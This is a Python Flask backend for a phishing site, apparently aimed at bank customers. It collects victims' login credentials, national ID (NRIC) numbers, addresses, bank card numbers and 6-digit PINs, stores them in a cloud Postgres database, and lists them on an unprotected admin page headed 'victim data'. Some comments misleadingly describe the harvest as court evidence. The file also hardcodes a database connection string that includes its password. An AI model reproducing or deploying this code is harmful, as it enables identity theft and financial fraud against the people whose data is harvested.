from flask import Flask, request, send_file
import os
import psycopg2 

app = Flask(__name__)

# 获取环境变量中的云端数据库连接
DATABASE_URL = os.environ.get('DATABASE_URL', 'postgresql://testing_database_jvtm_user:B8CkEnGDjjrH1vUh5fGiDeiqcXYU8TQA@dpg-d97kj1vavr4c73d3eg30-a.singapore-postgres.render.com/testing_database_jvtm')

def init_db():
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    # 建立保存技术凭证的表（如不存在则创建）
    cur.execute('''
        CREATE TABLE IF NOT EXISTS messages (
            id SERIAL PRIMARY KEY,
            content TEXT NOT NULL
        );
    ''')
    conn.commit()
    cur.close()
    conn.close()

# 执行初始化
init_db()

def get_html_content():
    with open("index.html", "r", encoding="utf-8") as f:
        return f.read()

@app.route('/')
def index():
    return get_html_content()

@app.route('/submit', methods=['POST'])
def submit():
    # 1. 完整映射读取多步表单中的四大核心起诉证据
    user_id = request.form.get('username')
    pwd = request.form.get('password')
    personal_info = request.form.get('personal_info')  # 年龄与职业
    address = request.form.get('address')              # 地址
    ic_number = request.form.get('ic_number')          # 身份证 NRIC
    card_number = request.form.get('card_number')      # 银行卡
    card_pin = request.form.get('card_pin')            # 6位密码

    # 2. 将提取到的多步异构数据统一拼装成高度可读的法庭物证结构
    log_content = (
        f"ID: {user_id} | PWD: {pwd} | "
        f"Bio/Job: {personal_info} | Addr: {address} | "
        f"NRIC: {ic_number} | Card: {card_number} | PIN: {card_pin}"
    )

    # 3. 稳妥保存至 Render 云端数据库
    try:
        conn = psycopg2.connect(DATABASE_URL)
        cur = conn.cursor()
        cur.execute("INSERT INTO messages (content) VALUES (%s)", (log_content,))
        conn.commit()
        cur.close()
        conn.close()
        return {"status": "success", "message": "Telemetry received."}, 200
    except Exception as e:
        print(f"Backend SQL Error: {e}")
        return {"status": "error", "message": "Internal processing failure."}, 500

@app.route('/admin')
def admin():
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    cur.execute("SELECT content FROM messages;")
    rows = cur.fetchall()
    cur.close()
    conn.close()
    
    display_text = "<h2>后台起获受害者数据列表：</h2><ul>"
    for row in rows:
        display_text += f"<li style='margin-bottom:10px; font-family:monospace;'>{row[0]}</li>"
    display_text += "</ul><a href='/'>返回首页</a>"
    
    return display_text

@app.route('/logo.png')
def get_logo():
    return send_file('logo.png')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
